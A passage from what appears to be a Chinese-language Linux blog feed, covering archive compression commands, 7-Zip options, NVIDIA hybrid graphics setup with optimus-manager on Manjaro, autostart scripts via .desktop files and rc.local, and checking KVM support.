<h2 id="tar-Z"><a href="#tar-Z" class="headerlink" title=".tar.Z"></a>.tar.Z</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar Zxvf File_Name.tar.Z</span><br><span class="line"><span class="comment"># 压缩</span></span><br><span class="line">tar Zcvf File_Name.tar.Z File_Or_Dir_Name</span><br></pre></td></tr></table></figure>
<h2 id="zip"><a href="#zip" class="headerlink" title=".zip"></a>.zip</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">unzip File_Name.zip    <span class="comment"># 解压到当前目录</span></span><br><span class="line">unzip File_Name.zip -d Dir    <span class="comment"># 解压到指定目录</span></span><br><span class="line"><span class="comment"># 压缩</span></span><br><span class="line">zip File_Name.zip File_Or_Dir_Name</span><br></pre></td></tr></table></figure>
<h2 id="rar"><a href="#rar" class="headerlink" title=".rar"></a>.rar</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">rar x File_Name.rar</span><br><span class="line"><span class="comment"># 压缩</span></span><br><span class="line">rar a File_Name.rar File_Or_Dir_Name</span><br></pre></td></tr></table></figure>
<h2 id="lha"><a href="#lha" class="headerlink" title=".lha"></a>.lha</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">lha -e File_Name.lna</span><br><span class="line"><span class="comment"># 压缩</span></span><br><span class="line">lna -a File_Name.lha File_Name</span><br></pre></td></tr></table></figure>
<h2 id="rpm"><a href="#rpm" class="headerlink" title=".rpm"></a>.rpm</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解包</span></span><br><span class="line">rpm2cpio File_Name.rpm | cpio -div</span><br></pre></td></tr></table></figure>
<h2 id="deb"><a href="#deb" class="headerlink" title=".deb"></a>.deb</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解包</span></span><br><span class="line">ar p File_Name.deb data.tar.gz | tar zxf -</span><br></pre></td></tr></table></figure>
<h2 id="万能"><a href="#万能" class="headerlink" title="万能"></a>万能</h2><p><strong>.tar .tgz .tar.gz .tar.Z .tar.bz .tar.bz2 .zip .cpio .rpm .deb .slp .arj .rar .ace .lha .lzh .lzx .lzs .arc .sda .sfx .lnx .zoo .cab .kar .cpt .pit .sit .sea</strong></p>
<p><strong>安装sEx</strong><br><a href="http://sourceforge.net/projects/sex">下载</a>解压后将其中的可执行文件sEx拷贝到 /usr/bin目录（其他由$PATH环境变量指定的目录也可）</p>
<p><strong>sEx只是调用相关程序，本身并无压缩、解压功能,所以对相应的格式压解包时需要安装有相关压缩程序</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">sEx x File_Name.*</span><br><span class="line"><span class="comment"># 压缩</span></span><br><span class="line">sEx a File_Name.* File_Name</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
        <category>命令</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux文件压缩与解压之7z</title>
    <url>/2020/02/11/Linux%E6%96%87%E4%BB%B6%E5%8E%8B%E7%BC%A9%E4%B8%8E%E8%A7%A3%E5%8E%8B%E4%B9%8B7z/</url>
    <content><![CDATA[<h1 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h1><p><code>a</code>    添加</p>
<p><code>d</code>    删除</p>
<p><code>e</code>    解压</p>
<p><code>x</code>    带路径解压</p>
<p><code>l</code>    列表查看</p>
<p><code>t</code>    测试</p>
<p><code>u</code>    更新</p>
<h1 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h1><a id="more"></a>
<p><code>-m</code>                 压缩方式</p>
<p><code>-m0=压缩算法</code>        默认使用 lzma</p>
<p><code>-mx=数字</code>            1~9 压缩级别</p>
<p><code>-mfb=64</code>            number of fast bytes for LZMA = 64</p>
<p><code>-md=字典大小</code>        设置字典大小，例如 -md=32m</p>
<p><code>-ms=on|off</code>        是否固实压缩</p>
<p><code>-o输出目录</code>        设置输出目录</p>
<p><code>-p密码</code>            使用密码</p>
<p><code>-r数字</code>            递归，使用数字定义递归子目录的深度</p>
<p><code>-sfx[模块名称]</code>    使用自解压模块</p>
<p><code>-si</code>                从标准输入设备读入数据</p>
<p><code>-so</code>                将数据写入标准输出设备</p>
<p><code>-y</code>                所有询问均回答 Yes</p>
<p><code>-w路径</code>            设置工作目录</p>
<p>用法<br>7za &lt;命令&gt; [&lt;参数开关&gt;…] &lt;档案名称&gt; [&lt;文件名称&gt;|&lt;@列表文件…&gt;]<br>在方括号内的表达式(“[” 和 “]”之间的字符)是可选的。在书名号内的表达式(“&lt;” 和 “&gt;”之间的字符)是必须替换的表达式(而且要去掉括号)。</p>
<p>7-Zip 支持和 Windows 相类似的通配符：<br>“<em>”可以使用星号代替零个或多个字符。<br>“?”可以用问号代替名称中的单个字符。<br>如果只用</em>，7-Zip 会将其视为任何扩展名的全部文件。</p>
<p>命令<br>a: 添加到压缩文件</p>
<p>b: 基准测试</p>
<p>d: 从档案中删除文件</p>
<p>e: 解压档案文件 (无目录名称)</p>
<p>l: 列出压缩文件内容</p>
<p>t: 测试压缩文件的完整性</p>
<p>u: 更新文件到压缩文件中</p>
<p>x: 完整路径下解压文件</p>
<p>参数开关<br>-ai[r[-|0]]{@列表文件|!通配符}: 包括 压缩文件</p>
<p>-ax[r[-|0]]{@列表文件|!通配符}: 排除 压缩文件</p>
<p>-bd: 禁用百分比显示功能</p>
<p>-i[r[-|0]]{@列表文件|!通配符}: 包括 文件名称</p>
<p>-m{参数}: 设置压缩算法</p>
<p>-o{目录}: 设置输出目录</p>
<p>-p{密码}: 设置密码</p>
<p>-r[数字]: 递归子目录，使用数字定义递归子目录的深度</p>
<p>-scs{UTF-8 | WIN | DOS}: 设置列表文件的编码格式</p>
<p>-sfx[{名称}]: 创建 SFX 自解压文件</p>
<p>-si[{名称}]: 从stdin(标准输入设备)读取数据</p>
<p>-slt: 为 l (列表) 命令显示技术信息</p>
<p>-so: 将数据写入stdout(标准输出设备)</p>
<p>-ssc[-]: 设置大小写区分模式</p>
<p>-ssw: 压缩共享文件</p>
<p>-t{类型}: 设置压缩文件格式，(7z, zip, gzip, bzip2 or tar. 7z是默认的格式)</p>
<p>-v{大小}[b|k|m|g]: 分卷压缩</p>
<p>-u[-][p#][q#][r#][x#][y#][z#][!新建档案_名称]: 更新选项</p>
<p>-w[{路径}]: 指定工作目录，路径为空时代表临时文件夹目录</p>
<p>-x[r[-|0]]]{@列表文件|!通配符}: 排除 文件名称</p>
<p>-y: 所有询问选是</p>
<p>使用’-m’参数，即设置压缩算法时，有许多选项可以进行设置。</p>
<p>-m&lt;压缩方式&gt;，关于它有许多参数及指令，这里仅介绍简单且常用的用法。<br>-m0=&lt;压缩算法&gt; 默认使用 lzma</p>
<p>-md=&lt;字典大小&gt; 设置字典大小,例如 -md=32m</p>
<p>-mfb=64 number of fast bytes for LZMA = 64</p>
<p>-ms=<on|off> 是否固实压缩</on|off></p>
<p>-mx=<1~9> 压缩级别</1~9></p>
<p>更多关于’-m’参数的使用，请参考此处。</p>
<p>退出代码<br>0 ：正常，没有错误</p>
<p>1 ：警告，没有致命的错误，例如某些文件正在被使用，没有被压缩</p>
<p>2 ：致命错误</p>
<p>7 ：命令行错误</p>
<p>8 ：没有足够的内存</p>
<p>255 ：用户中止了操作</p>
<p>命令示例</p>
<p>a 添加文件到压缩档案<br>7z a archive1.zip subdir\ ：增加subdir文件夹下的所有的文件和子文件夹到archive1.zip中，archived1.zip中的文件名包含subdir\前缀。</p>
<p>7z a archive2.zip .\subdir* ：增加subdir文件夹下的所有的文件和子文件夹到archive1.zip中，archived2.zip中的文件名不包含subdir\前缀。</p>
<p>cd /D c:\dir1\<br>7z a c:\archive3.zip dir2\dir3\ ：archiive3.zip中的文件名将包含dir2\dir3\前缀，但是不包含c:\dir1前缀。</p>
<p>7z a Files.7z *.txt -r ： 增加当前文件夹及其子文件夹下的所有的txt文件到Files.7z中。</p>
<p>b 测试 CPU 运行速度及检查内存错误</p>
<p>d 从压缩档案删除文件<br>7z d freeoarch.7z *.bak -r ：从freeoarch.7z中删除所有的bak文件。</p>
<p>e 从压缩档案中释放文件到当前目录中，或者到指定的输出文件夹。输出文件夹设置可以通过 -o (设置输出文件夹)选项来更改，此命令会将所有被释放的文件放置到一个文件夹。如果您想使用完整路径释放文件，您必须使用 x (完整路径释放) 命令。</p>
<p>7z e freeoarch.7z ：从压缩档案 freeoarch.7z 中释放所有文件到当前文件夹。</p>
<p>7z e freeoarch.7z -oc:\soft <em>.cpp ：从压缩档案 freeoarch.7z 中释放 </em>.cpp 文件到 c:\soft 文件夹。</p>
<p>l 列出压缩档案内容<br>7z l freeoarch.7z ：列出压缩档案 freeoarch.7z 的内容。</p>
<p>t 测试压缩档案文件的完整性<br>7z t freeoarch.7z <em>.doc ：在压缩档案 freeoarch.7z 中测试 </em>.doc 文件的完整性。</p>
<p>u 在压缩档案文件中使用较新的文件替换掉较旧的文件<br>7z u freeoarch.7z <em>.doc ：在压缩档案 freeoarch.7z 中更新 </em>.doc 文件。</p>
<p>x 在当前目录中，使用完整路径从压缩档案中释放文件.或者到指定的输出文件夹<br>7z x freeoarch.7z ：从压缩档案 freeoarch.7z 中释放所有文件到当前文件夹。</p>
<p>7z x freeoarch.7z -oc:\soft <em>.cpp ：从压缩档案 freeoarch.7z 中释放 </em>.cpp 文件到 c:\soft 文件夹。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux独立显卡驱动安装</title>
    <url>/2019/10/19/Linux%E7%8B%AC%E7%AB%8B%E6%98%BE%E5%8D%A1%E9%A9%B1%E5%8A%A8%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<p>  Linux到独立显卡分开源驱动和闭源驱动两种，开源驱动不能完全发挥独立显卡到性能，闭源驱动使用<code>bumblebee</code> 的 <code>optirun</code> 的兼容性不好。而 <code>optimus-manager</code> 可以设置开机默认使用 Intel 还是 Nvidia ，可以随时在这两者之间切换。</p>
<a id="more"></a>
<h1 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -S virtualgl lib32-virtualgl lib32-primus primus</span><br></pre></td></tr></table></figure>
<h1 id="安装闭源bumblebee版驱动"><a href="#安装闭源bumblebee版驱动" class="headerlink" title="安装闭源bumblebee版驱动"></a>安装闭源bumblebee版驱动</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># sudo mhwd -f -i pci video-hybrid-intel-nvidia-bumblebee</span><br><span class="line">sudo mhwd -f -i pci video-hybrid-intel-nvidia-430xx-bumblebee</span><br></pre></td></tr></table></figure>
<h2 id="讲用户加入到bumblee组"><a href="#讲用户加入到bumblee组" class="headerlink" title="讲用户加入到bumblee组"></a>讲用户加入到bumblee组</h2><p>sudo gpasswd -a $USER bumblebee</p>
<h2 id="设置bumblebeed开机自启"><a href="#设置bumblebeed开机自启" class="headerlink" title="设置bumblebeed开机自启"></a>设置bumblebeed开机自启</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo systemctl enable bumblebeed</span><br></pre></td></tr></table></figure>
<p><strong>很多硬件厂商的BIOS驱动对Linux不友好，无法顺利加载ACPI模块，从而导致无法驱动独立显卡，这就需要修改grub启动文件使ACPI模块能正常工作</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vim &#x2F;etc&#x2F;default&#x2F;grub</span><br><span class="line"></span><br><span class="line"># 在 GRUB_CMDLINE_LINUX_DEFAULT&#x3D;&quot;quiet acpi_osi&#x3D;! resume&#x3D;UUID&#x3D;2d6d6716-4886-49ff-a277-55ba5d9f19d8&quot; 中加入 acpi_osi&#x3D;’Windows 2009’ 或者 acpi_osi&#x3D;! acpi_osi&#x3D;Linux acpi_osi&#x3D;’Windows 2015’ pcie_port_pm&#x3D;off</span><br><span class="line"># acpi_osi&#x3D;’Windows 2009’的意思是告诉ACPI模块，我是‘Windows 7’，模拟Windows让其继续运行</span><br><span class="line"></span><br><span class="line"># 如：</span><br><span class="line">GRUB_CMDLINE_LINUX_DEFAULT&#x3D;&quot;quiet acpi_osi&#x3D;! acpi_osi&#x3D;’Windows 2009’ resume&#x3D;UUID&#x3D;2d6d6716-4886-49ff-a277-55ba5d9f19d8&quot;</span><br></pre></td></tr></table></figure></p>
<h2 id="更新grub文件，使永久有效"><a href="#更新grub文件，使永久有效" class="headerlink" title="更新grub文件，使永久有效"></a>更新grub文件，使永久有效</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo update-grub</span><br><span class="line"></span><br><span class="line">#重启</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
<h2 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 安装性能测试软件</span><br><span class="line">sudo pacman -S mesa-demos</span><br><span class="line">sudo pacman -S glmark2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="测试集显性能"><a href="#测试集显性能" class="headerlink" title="测试集显性能"></a>测试集显性能</h1><p>glxgears<br>glmark2</p>
<h1 id="测试独显性能"><a href="#测试独显性能" class="headerlink" title="测试独显性能"></a>测试独显性能</h1><p>optirun glxgears<br>optirun glmark2<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## NVIDIA setting面板打不开使用以下命令</span><br></pre></td></tr></table></figure><br>optirun -b none nvidia-settings -c :8<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"># 使用optimus-manager管理显卡</span><br><span class="line"></span><br><span class="line">[optimus-manager仓库](https:&#x2F;&#x2F;github.com&#x2F;Askannz&#x2F;optimus-manager)</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;bash</span><br><span class="line">sudo pacman -S optimus-manager</span><br></pre></td></tr></table></figure></p>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>确保 <code>/etc/X11/xorg.conf</code> 和 <code>/etc/X11/xorg.conf.d</code> 下没有其他显卡和显示相关的配置，如果有的话可以备份后删掉,原因是 <code>optimus-manager</code> 会生成显卡配置文件 <code>/etc/X11/xorg.conf.d/10-optimus-manager.conf</code>,多个显卡配置文件可能导致出错</p>
<p><strong>目录结构如下</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tree &#x2F;etc&#x2F;X11&#x2F;</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;X11&#x2F;</span><br><span class="line">├── xinit</span><br><span class="line">│   └── xinitrc.d</span><br><span class="line">│       ├── 40-libcanberra-gtk-module.sh</span><br><span class="line">│       └── 50-systemd-user.sh</span><br><span class="line">└── xorg.conf.d</span><br><span class="line">        └── 10-optimus-manager.conf</span><br></pre></td></tr></table></figure></p>
<h2 id="关闭-bumblebeed"><a href="#关闭-bumblebeed" class="headerlink" title="关闭 bumblebeed"></a>关闭 bumblebeed</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl stop bumblebeed</span><br><span class="line">sudo systemctl <span class="built_in">disable</span> bumblebeed</span><br></pre></td></tr></table></figure>
<h1 id="启动optimus-manager服务"><a href="#启动optimus-manager服务" class="headerlink" title="启动optimus-manager服务"></a>启动optimus-manager服务</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo systemctl enable optimus-manager</span><br></pre></td></tr></table></figure>
<p><strong>重启</strong></p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 切换到nvidia</span><br><span class="line">optimus-manager --switch nvidia</span><br><span class="line"></span><br><span class="line"># 切换到Intel</span><br><span class="line">optimus-manager --switch intel</span><br><span class="line"></span><br><span class="line"># 设置开机使用intel</span><br><span class="line">optimus-manager --set-startup&#x3D;intel</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">optimus-manager [参数]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可选参数：</span></span><br><span class="line">-h，--<span class="built_in">help</span> 			显示此帮助消息并退出</span><br><span class="line">-v，--version 		打印版本并退出</span><br><span class="line">--status 			打印optimus-manager的当前状态</span><br><span class="line">--print-mode 		打印当前桌面会话正在运行的GPU模式</span><br><span class="line">--print-next-mode 	打印下次登录会话时将使用的GPU模式</span><br><span class="line">--print-startup 	打印将在启动时使用的GPU模式</span><br><span class="line">--switch MODE 		将GPU模式设置为MODE。需要注销然后登录以应用更改。可选模式：intel，nvidia，hybrid，auto（自动检测您可能想要切换到的模式）</span><br><span class="line">--set-startup STARTUP_MODE 		将启动模式设置为STARTUP_MODE。可选模式：intel，nvidia，hybrid</span><br><span class="line">--temp-config  		PATH设置临时配置文件的路径，仅用于下次重新引导。对于测试电源开关配置而不会导致无法启动的安装很有用</span><br><span class="line">--no-confirm 		切换GPU时不要求确认并跳过所有警告</span><br><span class="line">--cleanup 			删除守护程序剩余的自动生成的配置文件</span><br></pre></td></tr></table></figure>
<p>intel模式为省电模式，nvidia模式为游戏模式</p>
<h2 id="使用图形界面配置"><a href="#使用图形界面配置" class="headerlink" title="使用图形界面配置"></a>使用图形界面配置</h2><p>通过<a href="https://github.com/Shatur95/optimus-manager-qt"><code>optimus-manager-qt</code></a>或gnome-sell扩展<a href="https://github.com/inzar98/optimus-manager-argos"><code>optimus-manager-argos</code></a>来使用图形化前端来进行切换</p>
<p>图形化配置通过生成<code>/etc/share/optimus-manager.conf</code>文件并添加内容实现配置的，如果已经有该文件会直接覆盖修改</p>
<h1 id="配置文件详解"><a href="#配置文件详解" class="headerlink" title="配置文件详解"></a>配置文件详解</h1><p>optimus-manager的配置文件：<code>/usr/share/optimus-manager.conf</code></p>
<p><strong>如需自定义配置，将该文件复制一份到<code>/etc/optimus-manager/</code>目录下进行修改即可</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[optimus]</span><br><span class="line"></span><br><span class="line"># 此参数定义接通Nvidia卡电源的方法</span><br><span class="line"># 可能的值：</span><br><span class="line"># -nouveau：将nouveau模块加载到Nvidia卡上</span><br><span class="line"># -bbswitch：使用bbswitch模块关闭卡的电源（需要bbswitch依赖项）</span><br><span class="line"># -acpi_call：尝试各种ACPI方法调用来打开和关闭卡的电源（需要acpi_call依赖项）</span><br><span class="line"># -none：请勿将外部模块用于电源管理。对于某些笔记本电脑型号，最好将此选项与pci_power_control结合使用（请参见下文）。设置该选项后，您还可以使用脚本nvidia-enable.sh和nvidia-disable.sh执行自定义命令以进行电源管理</span><br><span class="line"></span><br><span class="line">switching&#x3D;bbswitch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 在Intel模式下启用PCI电源管理。此选项与acpi_call和bbswitch不兼容，因此在这些情况下将被忽略</span><br><span class="line"></span><br><span class="line">pci_power_control&#x3D;yes</span><br><span class="line"></span><br><span class="line"># 从PCI总线上卸下Nvidia卡。可以防止电源开关引起的死机。如果switching &#x3D; nouveau或switching &#x3D; bbswitch则被忽略</span><br><span class="line"></span><br><span class="line">pci_remove&#x3D;no</span><br><span class="line"></span><br><span class="line"># 在重新加载nvidia模块之前，请在PCI级别上重置Nvidia卡。在重新加载nvidia模块之前，请确保卡处于新状态。可能会解决一些切换问题</span><br><span class="line"># 可能的值:</span><br><span class="line"># -no:不执行任何重置</span><br><span class="line"># -function_level:执行轻度的“功能级别”重置</span><br><span class="line"># -hot_reset:对PCI桥接器执行“热重置”。注意：此方法直接与硬件混淆，使用前请阅读optimus-manager的在线文档。另外，即使pci_remove&#x3D;no，也会执行PCI移除操作</span><br><span class="line"></span><br><span class="line">pci_reset&#x3D;no</span><br><span class="line"></span><br><span class="line"># 切换GPU时自动注销当前的桌面会话。当前，以下DE &#x2F; WM支持此功能：KDE Plasma，GNOME，XFCE，Deepin，i3，Openbox，AwesomeWM，bspwm如果禁用此选项或使用其他桌面环境，则GPU切换仅在下一个图形显示时有效会话登录</span><br><span class="line"></span><br><span class="line">auto_logout &#x3D;yes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[intel]</span><br><span class="line"></span><br><span class="line"># 用于Intel GPU的驱动程序。</span><br><span class="line"># 可能的值:modesetting，intel</span><br><span class="line"># 要使用intel驱动程序，需要安装软件包“ xf86-video-intel”</span><br><span class="line"></span><br><span class="line">driver&#x3D;modesetting</span><br><span class="line"></span><br><span class="line"># 加速方法（对应于Xorg配置中的AccelMethod）。仅适用于intel驱动程序</span><br><span class="line"># 可能的值:sna,xna</span><br><span class="line"># 默认值（未指定任何选项）</span><br><span class="line">accel&#x3D;</span><br><span class="line"></span><br><span class="line"># 在Xorg配置中启用TearFree选项，仅适用于intel驱动程序</span><br><span class="line"># 可能的值:yes,no</span><br><span class="line"># 保留默认值（未指定任何选项）</span><br><span class="line">tearfree&#x3D;</span><br></pre></td></tr></table></figure>
<p>参考:<br><a href="https://blog.edward-p.xyz/2019/04/optimus-manager/">使用 optimus-manager 来管理显卡切换</a></p>
<p>Optimus-Manager的<br><a href="https://github.com/Askannz/optimus-manager/blob/master/README.md">README</a><br><a href="https://github.com/Askannz/optimus-manager/wiki">Wiki</a><br><a href="https://github.com/Askannz/optimus-manager/wiki/A-guide--to-power-management-options">电源管理选项指南</a><br><a href="https://github.com/Askannz/optimus-manager/wiki/FAQ,-common-issues,-troubleshooting">常见问题，常见问题，故障排除</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Manjaro自定义脚本开机运行</title>
    <url>/2019/09/21/Manjaro%E8%87%AA%E5%AE%9A%E4%B9%89%E8%84%9A%E6%9C%AC%E5%BC%80%E6%9C%BA%E8%BF%90%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="通过启动器"><a href="#通过启动器" class="headerlink" title="通过启动器"></a>通过启动器</h1><p><strong>现在需要开机运行自定义脚本<code>~/my_shell.sh</code></strong></p>
<h3 id="创建启动器文件"><a href="#创建启动器文件" class="headerlink" title="创建启动器文件"></a>创建启动器文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.config/autostart/my_shell.desktop</span><br></pre></td></tr></table></figure>
<p><strong>内容</strong>：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Desktop Entry]</span><br><span class="line">Encoding=UTF-8</span><br><span class="line">Name=my shell script</span><br><span class="line">GenericName=my shell script</span><br><span class="line">Comment=The is my shell script</span><br><span class="line">Exec=~/my_shell.sh %f</span><br><span class="line">Icon=~/my_shell.png</span><br><span class="line">Terminal=<span class="literal">false</span></span><br><span class="line">Type=Application</span><br><span class="line">Categories=Application;Programme;</span><br></pre></td></tr></table></figure><br><a id="more"></a></p>
<h3 id="启动器文件语法"><a href="#启动器文件语法" class="headerlink" title="启动器文件语法"></a>启动器文件语法</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">关键词</th>
<th style="text-align:center">意义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>[Desktop Entry]</code></td>
<td style="text-align:center">文件头</td>
</tr>
<tr>
<td style="text-align:left"><code>Encoding</code></td>
<td style="text-align:center">编码</td>
</tr>
<tr>
<td style="text-align:left"><code>Name</code></td>
<td style="text-align:center">应用名称</td>
</tr>
<tr>
<td style="text-align:left"><code>Name[xx]</code></td>
<td style="text-align:center">不同语言的应用名称</td>
</tr>
<tr>
<td style="text-align:left"><code>GenericName</code></td>
<td style="text-align:center">描述</td>
</tr>
<tr>
<td style="text-align:left"><code>Comment</code></td>
<td style="text-align:center">注释</td>
</tr>
<tr>
<td style="text-align:left"><code>Exec</code></td>
<td style="text-align:center">执行的命令</td>
</tr>
<tr>
<td style="text-align:left"><code>Icon</code></td>
<td style="text-align:center">图标路径</td>
</tr>
<tr>
<td style="text-align:left"><code>Terminal</code></td>
<td style="text-align:center">是否使用终端</td>
</tr>
<tr>
<td style="text-align:left"><code>Type</code></td>
<td style="text-align:center">启动器类型</td>
</tr>
<tr>
<td style="text-align:left"><code>Categories</code></td>
<td style="text-align:center">应用的类型（内容相关）</td>
</tr>
</tbody>
</table>
</div>
<p><strong>Exec</strong>常用的参数有：<code>%f</code> <code>%F</code> <code>%u</code> <code>%U</code><br><code>%f</code>：单个文件名，即使选择了多个文件。如果已选择的文件不在本地文件系统中（比如说在HTTP或者FTP上），这个文件将被作为一个临时文件复制到本地，％f将指向本地临时文件；<br><code>%F</code>：文件列表。用于程序可以同时打开多个本地文件。每个文件以分割段的方式传递给执行程序。<br><code>%u</code>：单个URL。本地文件以文件URL或文件路径的方式传递。<br><code>%U</code>：URL列表。每个URL以分割段的方式传递给执行程序。本地文件以文件URL或文件路径的方式传递</p>
<h3 id="赋予执行权限"><a href="#赋予执行权限" class="headerlink" title="赋予执行权限"></a>赋予执行权限</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod +x ~/.config/autostart/my_shell.desktop</span><br></pre></td></tr></table></figure>
<h1 id="通过rc-local方式"><a href="#通过rc-local方式" class="headerlink" title="通过rc.local方式"></a>通过rc.local方式</h1><p><strong>arch系是不支持<code>rc.local</code>的，若需要开机以管理员执行就需要用到<code>rc.local</code></strong></p>
<h3 id="安装启用rc-local"><a href="#安装启用rc-local" class="headerlink" title="安装启用rc.local"></a>安装启用<code>rc.local</code></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S systemd-rc-local</span><br><span class="line">systemctl <span class="built_in">enable</span> rc-local</span><br></pre></td></tr></table></figure>
<h3 id="创建rc-local文件"><a href="#创建rc-local文件" class="headerlink" title="创建rc.local文件"></a>创建<code>rc.local</code>文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo touch /etc/rc.local</span><br><span class="line">sudo chmod 755 /etc/rc.local</span><br></pre></td></tr></table></figure>
<h3 id="编辑运行脚本"><a href="#编辑运行脚本" class="headerlink" title="编辑运行脚本"></a>编辑运行脚本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/rc.local</span><br><span class="line"><span class="comment">#加入内容</span></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">chmod 666 /etc/sda</span><br><span class="line"></span><br><span class="line"><span class="comment">#也可另外创建一个脚本文件，添加执行该脚本的执行语句</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
        <category>Manjaro</category>
      </categories>
      <tags>
        <tag>Manjaro</tag>
      </tags>
  </entry>
  <entry>
    <title>Manjaro部署kvm虚拟机</title>
    <url>/2019/08/26/Manjaro%E9%83%A8%E7%BD%B2kvm%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
    <content><![CDATA[<h1 id="Manjaro部署kvm虚拟机"><a href="#Manjaro部署kvm虚拟机" class="headerlink" title="Manjaro部署kvm虚拟机"></a>Manjaro部署kvm虚拟机</h1><h3 id="检测是否支持kvm"><a href="#检测是否支持kvm" class="headerlink" title="检测是否支持kvm"></a>检测是否支持kvm</h3><h4 id="CPU是否支持虚拟化"><a href="#CPU是否支持虚拟化" class="headerlink" title="CPU是否支持虚拟化"></a>CPU是否支持虚拟化</h4><p>kvm需要宿主机cpu支持虚拟化（inter cpu的<code>VT-x</code>技术、AMD cpu的<code>AMD-v</code>技术）<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -E <span class="string">&quot;(vmx|svm)&quot;</span> --color=always /proc/cpuinfo</span><br></pre></td></tr></table></figure><br>如果输出中有<code>vmx</code> 或者<code>svm</code>就说明支持虚拟化；如果没有任何的输出，说明<strong>未开启CPU虚拟化</strong>(需到BIOS中开启,不同品牌的开启方式都有所不同，网上都会有教程)或<strong>CPU不支持虚拟化</strong>(无缘虚拟机)</p>
<a id="more"></a>
<h4 id="内核是否支持"><a href="#内核是否支持" class="headerlink" title="内核是否支持"></a>内核是否支持</h4><ul>
<li><strong>KVM模块</strong><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zgrep KVM /proc/config.gz</span><br></pre></td></tr></table></figure>
<blockquote>
<p>模块设定是y或m，则该模块可用</p>
</blockquote>
</li>
</ul>
<ul>
<li><strong>VirtIO模块</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zgrep VIRTIO /proc/config.gz</span><br></pre></td></tr></table></figure>
<blockquote>
<p>准/半虚拟化是在全虚拟化的基础上，把客户操作系统进行了修改，增加了一个专门的API，这个API可以将客户操作系统发出的指令进行最优化。<br>KVM提供Virtio作为hypervisor和来宾之间的一层API。所有的Virtio有两部分组成：主机设备和客户驱动程序<br>模块设定是y或m，则该模块可用</p>
</blockquote>
<ul>
<li><strong>内核模块是否装载</strong><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsmod | grep kvm</span><br><span class="line">lsmod | grep virtio</span><br></pre></td></tr></table></figure>
若没有返回任何信息，说明没有装载，需要自行装载，控制内核模块装载、卸载的命令由<code>kmod</code>软件包提供<ul>
<li>手动装/卸载<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo modprobe virtio				<span class="comment"># 装载内核模块virtio</span></span><br><span class="line">sudo modprobe -r / rmmod virtio		<span class="comment">#卸载内核模块virtio</span></span><br></pre></td></tr></table></figure></li>
